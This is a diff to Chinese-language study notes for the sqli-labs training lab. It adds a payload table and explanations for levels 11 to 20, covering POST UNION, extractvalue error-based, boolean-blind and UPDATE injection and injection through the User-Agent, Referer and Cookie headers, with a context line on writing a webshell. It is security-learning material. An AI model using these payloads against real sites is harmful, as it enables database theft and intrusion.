@@ -37,6 +37,16 @@
 | Less-8 | 字符型 GET（不报错） | `'` | 布尔盲注 | `?id=1' AND substr(database(),1,1)='s' --+` |
 | Less-9 | 字符型 GET（真假同页） | `'` | 时间盲注 | `?id=1' AND if(substr(database(),1,1)='s',sleep(3),0) --+` |
 | Less-10 | 字符型 GET（真假同页） | `"` | 时间盲注 | `?id=1" AND if(substr(database(),1,1)='s',sleep(3),0) --+` |
+| Less-11 | POST 字符型 | `'` | UNION 回显 | uname=`admin' --+` / `' UNION SELECT 1,version(),database() --+` |
+| Less-12 | POST 双引号括号 | `")` | UNION 回显 | uname=`) UNION SELECT 1,version(),database() --+` |
+| Less-13 | POST 单引号括号（无回显） | `')` | 报错注入 | uname=`) AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |
+| Less-14 | POST 双引号（无回显） | `"` | 报错注入 | uname=`" AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |
+| Less-15 | POST 单引号（不报错） | `'` | 布尔盲注 | uname=`admin' AND substr(database(),1,1)='s' --+` |
+| Less-16 | POST 双引号括号（不报错） | `")` | 布尔盲注 | uname=`admin") AND substr(database(),1,1)='s' --+` |
+| Less-17 | POST UPDATE（password 字段） | `'` | 报错注入 | passwd=`' AND extractvalue(1,concat(0x7e,database(),0x7e)) AND '` |
+| Less-18 | User-Agent 头部 | `'` | 报错注入 | UA=`' AND extractvalue(1,concat(0x7e,database(),0x7e)) AND '` |
+| Less-19 | Referer 头部 | `'` | 报错注入 | Referer=`' AND extractvalue(1,concat(0x7e,database(),0x7e)) AND '` |
+| Less-20 | Cookie 注入 | `'` | 报错/回显 | Cookie uname=`admin' AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |
 
 ## 盲注专题：Less-6~10
 
@@ -112,6 +122,28 @@ def time_blind(sql_inner, c):
 
 写成功后 `POST 1=phpinfo();` 验证。真实环境需知道绝对路径且有写权限，是实战常见拿 shell 手法。
 
+## POST 注入与头部/Cookie 注入专题：Less-11~20
+
+### 1. POST 型注入（Less-11 ~ Less-17）
+GET 注入参数在 URL，POST 注入参数在请求体（表单字段）。判闭合、数列、回显位思路完全一致，只是参数来源从 `$_GET` 变 `$_POST`。
+
+- **Less-11/12**：有回显 → 直接 UNION。uname 处闭合后 `--+` 注释掉密码判断即可登录。
+- **Less-13/14**：不回显数据，但保留 `mysqli_error` → 报错注入（extractvalue 把信息带进报错信息）。
+- **Less-15/16**：不报错、不回显 → 布尔盲注，靠页面有无 "You are in" 区分真假。
+- **Less-17**：UPDATE 语句注入，`password` 字段直接拼进 `UPDATE users SET password='$passwd' WHERE username='$uname'`。注入点在 password，用报错注入带出数据（注意：会真实改掉密码字段值，练习后记得跑 setup-db.php 重置）。
+
+### 2. 头部注入（Less-18 / Less-19）
+注入点不在表单，而在 HTTP 请求头：
+
+- **Less-18** 打 `User-Agent` 头：登录成功后后端把 UA 拼进 `INSERT INTO uagents ... VALUES ('$uagent',...)`，UA 里插 `' AND extractvalue(...) AND '` 触发报错。
+- **Less-19** 打 `Referer` 头，同理写入 `referers` 表。
+- 实操用 Burp Suite 改请求头，或用浏览器插件（ModHeader）改 UA/Referer。
+
+### 3. Cookie 注入（Less-20）
+登录成功后 username 写进 Cookie，后续请求从 `$_COOKIE['uname']` 取数拼 SQL：`SELECT * FROM users WHERE username='$cookee'`。改 Cookie 值即注入。Burp 改 Cookie，或浏览器开发者工具 Application 面板改。
+
+> 进阶关卡（Less-21~30）会在此基础上叠加：宽字节绕过（GBK）、二次注入、堆叠查询（`;`）、WAF 绕过。路线见文末。
+
 ## 关键陷阱 & 复盘
 
 ### 1. MySQL collation 不一致 → UNION 报错
@@ -133,7 +165,9 @@ sqli-labs/
 ├── index.php
 ├── Less-1/ ~ Less-5/   字符型/数字型/报错注入
 ├── Less-6/ ~ Less-10/  双引号报错 / 文件写入 / 布尔盲注 / 时间盲注
-└── sql-connections/     db-creds.inc + setup-db.php
+├── Less-11/ ~ Less-17/ POST 型（回显 / 报错 / 盲注 / UPDATE）
+├── Less-18/ ~ Less-20/ User-Agent / Referer / Cookie 头部注入
+└── sql-connections/     db-creds.inc + setup-db.php（含 uagents/referers 表）
 ```
 
 ## 复现步骤
@@ -150,7 +184,7 @@ sqli-labs/
 |---|---|---|---|
 | 入门 | Less-1 ~ Less-5 | 字符型/数字型 UNION、报错注入 | 完成 |
 | 盲注/文件 | Less-6 ~ Less-10 | 报错对称、文件写入、布尔盲注、时间盲注 | 完成 |
-| 进阶 | Less-11 ~ Less-20 | POST 注入、Cookie/Referer/UA 注入 | 计划 |
+| 进阶 | Less-11 ~ Less-20 | POST 注入、Cookie/Referer/UA 注入 | 完成 |
 | 高级 | Less-21 ~ Less-30 | 宽字节、二次注入、堆叠查询 | 计划 |
 | 工具化 | sqlmap 自动化 | 复用手工理解的 payload | 计划 |
 
